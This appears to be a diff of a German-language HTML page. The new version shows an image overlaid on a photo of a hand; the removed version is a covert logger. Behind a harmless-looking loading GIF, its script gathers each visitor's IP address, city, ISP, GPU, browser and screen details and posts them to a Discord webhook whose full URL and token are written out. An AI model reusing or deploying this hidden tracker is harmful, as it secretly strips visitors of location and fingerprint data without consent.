@@ -1,110 +1,60 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <title>Willkommen</title>
-    <style>
-        body {
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        img {
-            max-width: 90%;
-            max-height: 90%;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Bild im Bild auf Hand</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      position: relative;
+      display: inline-block;
+    }
+    .hand-image {
+      width: 300px;
+      border-radius: 10px;
+    }
+    .overlay-image {
+      position: absolute;
+      top: 70%;
+      left: 55%;
+      width: 100px;
+      height: 120px;
+      object-fit: cover;
+      border-radius: 12px;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+    input {
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
 
-<!-- Zeigt nur ein unauffälliges GIF -->
-<img src="https://media.tenor.com/1vCm3vSUyBwAAAAC/loading-buffering.gif" alt="Lädt...">
+  <h2>Bild-im-Bild auf der Hand</h2>
 
-<script>
-const webhookUrl = "https://discord.com/api/webhooks/1368984310924972192/qm9Htt3HVn8b7Y6SjaZm8VM4jUQe7h57FevbSEqoQcWHvo9Fh4sl5TDLmFahhZ8i41Ph"; // <-- Hier deinen Discord-Webhook einfügen
+  <div class="container">
+    <img src="IMG_2313.jpeg" alt="Hand" class="hand-image" id="handBase">
+    <img src="" alt="Overlay" class="overlay-image" id="overlayImg" style="display:none;">
+  </div>
 
-async function collectData() {
-    const data = {};
+  <input type="file" accept="image/*" onchange="loadImage(event)">
 
-    try {
-        // IPv4 von ipify holen
-        const ipify = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
-        data.ipv4 = ipify.ip;
-    } catch {
-        data.ipv4 = "Fehler beim Laden";
+  <script>
+    function loadImage(event) {
+      const image = document.getElementById('overlayImg');
+      image.src = URL.createObjectURL(event.target.files[0]);
+      image.style.display = 'block';
     }
-
-    try {
-        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-        data.country = ipData.country_name;
-        data.city = ipData.city;
-        data.region = ipData.region;
-        data.isp = ipData.org;
-    } catch {
-        data.country = "Unbekannt";
-    }
-
-    data.userAgent = navigator.userAgent;
-    data.language = navigator.language;
-    data.platform = navigator.platform;
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    data.screenResolution = `${window.screen.width}x${window.screen.height}`;
-    data.colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
-    data.touchSupport = 'ontouchstart' in window ? "Ja" : "Nein";
-    data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
-    data.localTime = new Date().toString();
-
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Nicht verfügbar";
-    } catch {
-        data.gpu = "Nicht ermittelbar";
-    }
-
-    return data;
-}
-
-async function sendToDiscord() {
-    const info = await collectData();
-
-    const embed = {
-        title: "Neuer Seitenbesuch",
-        color: 5814783,
-        fields: [
-            { name: "IPv4", value: info.ipv4 || "Unbekannt", inline: true },
-            { name: "Land", value: info.country || "Unbekannt", inline: true },
-            { name: "Stadt", value: info.city || "Unbekannt", inline: true },
-            { name: "Region", value: info.region || "Unbekannt", inline: true },
-            { name: "ISP", value: info.isp || "Unbekannt", inline: false },
-            { name: "GPU", value: info.gpu || "Unbekannt", inline: false },
-            { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
-            { name: "Sprache", value: info.language || "Unbekannt", inline: true },
-            { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
-            { name: "Zeitzone", value: info.timezone || "Unbekannt", inline: true },
-            { name: "Bildschirm", value: info.screenResolution || "Unbekannt", inline: true },
-            { name: "Farbmodus", value: info.colorScheme || "Unbekannt", inline: true },
-            { name: "Touchscreen", value: info.touchSupport || "Unbekannt", inline: true },
-            { name: "Ausrichtung", value: info.orientation || "Unbekannt", inline: true },
-            { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
-        ],
-        footer: { text: "Info automatisch gesammelt" },
-        timestamp: new Date()
-    };
-
-    await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
-    });
-}
-
-sendToDiscord();
-</script>
+  </script>
 
 </body>
 </html>
